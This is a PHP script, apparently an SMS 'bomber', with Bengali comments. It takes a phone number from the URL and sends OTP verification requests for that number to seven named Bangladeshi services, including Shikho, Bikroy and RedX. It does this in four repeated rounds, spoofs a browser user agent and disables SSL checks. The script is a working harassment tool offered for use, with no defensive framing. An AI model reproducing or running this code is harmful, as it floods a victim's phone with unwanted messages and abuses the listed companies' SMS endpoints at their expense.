<?php
// Error reporting off for production stability
error_reporting(0);
header('Content-Type: application/json');
set_time_limit(120); // প্রসেসিং টাইম বাড়িয়ে দেওয়া হলো

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    die(json_encode(["status" => "error", "message" => "Phone number missing"]));
}

$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$cookieFile = __DIR__ . '/cookies.txt';

// সার্ভার সাইড ফাইল হ্যান্ডলিং
if (!file_exists($cookieFile)) { touch($cookieFile); chmod($cookieFile, 0666); }

function send_request($url, $method = 'POST', $data = [], $headers = []) {
    global $cookieFile;
    $ch = curl_init();
    
    $curl_headers = array_merge([
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json'
    ], $headers);

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_COOKIEJAR => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $curl_headers,
        CURLOPT_POSTFIELDS => is_array($data) ? json_encode($data) : $data,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    
    $res = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ["code" => $httpCode, "data" => json_decode($res, true) ?: $res];
}

$results = [];

// ৪ বার লুপ করে সব সার্ভিস হিট করা
for($i = 1; $i <= 4; $i++) {
    $results["pbs_$i"] = send_request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', ["userPhone" => $phone_11]);
    $results["shikho_$i"] = send_request('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => "88".$phone_11, "type" => "student"]);
    $results["iqra_$i"] = send_request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET');
    $results["truck_$i"] = send_request('https://tethys.trucklagbe.com/tl_gateway/tl_login/128/loginWithPhoneNo', 'POST', ["userType" => "shipper", "phoneNo" => $phone_11]);
    $results["bdtickets_$i"] = send_request('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>"88".$phone_11,"applicationChannel"=>"WEB_APP"]);
    $results["bikroy_$i"] = send_request("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET');
    $results["redx_$i"] = send_request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11]);
    
    sleep(1); // প্রতিটি রাউন্ডের মাঝে ১ সেকেন্ড বিরতি
}

echo json_encode(["status" => "success", "results" => $results], JSON_PRETTY_PRINT);
?>
